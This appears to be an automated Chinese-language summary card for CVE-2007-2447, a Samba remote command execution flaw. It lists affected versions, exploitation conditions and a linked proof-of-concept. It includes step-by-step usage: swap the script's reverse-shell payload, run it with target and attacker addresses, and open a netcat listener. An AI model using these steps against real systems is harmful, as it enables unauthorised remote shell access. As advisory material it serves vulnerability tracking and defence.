## CVE-2007-2447-Samba-远程命令执行

**漏洞编号:** CVE-2007-2447

**漏洞类型:** 远程命令执行

**影响应用:** Samba

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** 3.0.0 to 3.0.25rc3

**利用条件:** 目标系统运行Samba服务，且启用了 'username map script' 选项（对于SamrChangePassword函数利用）或允许远程用户进行打印和文件共享管理 (对于其他MS-RPC函数利用)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2007-2447 存在于 Samba 的 MS-RPC 功能中。攻击者可以通过在 (1) SamrChangePassword 函数 (当启用了 `username map script` 选项时) 或 (2) 远程打印和 (3) 文件共享管理相关的其他 MS-RPC 函数中，利用 shell 元字符注入，来执行任意命令。提供的 exploit 代码 `samba-exploit.py` 尝试利用此漏洞。它通过构造包含反向 shell payload 的用户名，连接到目标 Samba 服务器。如果目标服务器启用了 `username map script` 并且存在漏洞，Samba 将会执行该 payload，从而允许攻击者在目标系统上执行任意命令。该漏洞的利用依赖于目标系统特定的配置，特别是是否启用 `username map script` 以及是否允许未经授权的访问打印和文件共享管理功能。该 POC 仅包含漏洞验证代码，几乎不含有恶意payload，LICENSE也为MIT开源协议,因此判定投毒风险极低。

**利用方式：**

1.  **确定目标 Samba 版本：** 确保目标运行的是受影响的 Samba 版本（3.0.0 到 3.0.25rc3）。
2.  **检查配置：** 确认目标系统启用了 `username map script` 选项（对于SamrChangePassword函数利用）或允许远程用户进行打印和文件共享管理 (对于其他MS-RPC函数利用)。
3.  **准备Payload：**  修改提供的POC脚本中的 payload,  payload 目前是反向shell,可以替换为其他的命令.
4.  **执行Exploit：** 运行 `samba-exploit.py` 脚本，提供目标 IP 地址、端口以及攻击者机器的 IP 地址和监听端口。例如：`python samba-exploit.py <RHOST> <RPORT> <LHOST> <LPORT>`
5.  **监听连接：** 在攻击者机器上使用 `nc -lvnp <LPORT>` 监听指定的端口，等待反向 shell 连接。

**项目地址:** [ozuma/CVE-2007-2447](https://github.com/ozuma/CVE-2007-2447)

**漏洞详情:** [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)